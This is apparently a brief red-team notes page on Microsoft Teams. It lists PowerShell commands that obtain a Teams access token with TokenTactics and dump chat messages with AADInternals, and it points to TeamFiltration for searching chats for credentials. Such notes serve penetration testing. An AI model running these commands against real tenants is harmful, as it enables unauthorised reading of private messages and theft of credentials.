---
title: Microsoft Teams
---

> Under construction 🚧

Obtain an access token for Teams with [[notes/tools/tokentactics]].

~~~ powershell
RefreshTo-MSTeamsToken -domain corp.com
echo $MSGraphToken.access_token
~~~

Access messages with [[notes/tools/aadinternals]].

~~~ powershell
Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | ft id,content,deletiontime,*type*,DisplayName
~~~

Search for credentials in Teams chats with [TeamFiltration](https://github.com/Flangvik/TeamFiltration).
